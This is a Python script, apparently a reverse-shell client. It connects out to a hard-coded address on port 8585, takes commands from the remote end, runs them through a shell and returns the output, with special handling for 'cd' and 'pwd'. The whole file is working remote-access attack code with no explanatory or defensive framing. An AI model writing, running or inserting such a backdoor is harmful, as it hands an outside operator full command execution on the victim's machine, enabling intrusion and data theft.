import socket
import subprocess
import os
import re
with socket.socket() as client :
    HOST = '192.168.18.1'
    PORT = 8585
    BIND = (HOST,PORT)
    client.connect(BIND)

    while True :
        cmd = client.recv(3600).decode()
        if cmd :
            cmd_output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if cmd_output.stderr and cmd != 'pwd' and cmd[0:2] != 'cd':
                client.sendall("CMDNOTFOUND".encode())
            elif cmd_output.stdout and cmd != 'pwd' and cmd[0:2] != 'cd':
                client.sendall(cmd_output.stdout.encode())
            elif not cmd_output.stdout and cmd != 'pwd' and cmd[0:2] != 'cd':
                client.sendall("[+] command was run successfully".encode())
            elif cmd == 'pwd' and cmd[0:2] != 'cd':
                pwd = os.getcwd()
                client.sendall(pwd.encode())
            elif cmd[0:2] == 'cd' and cmd != 'pwd' :
                PATH = cmd[2:].strip()
                checkpath = os.path.exists(PATH)
                if checkpath == True:
                    os.chdir(PATH)
                    client.sendall('TRUEPATH'.encode())
                elif checkpath == False:
                    client.sendall('FALSEPATH'.encode())
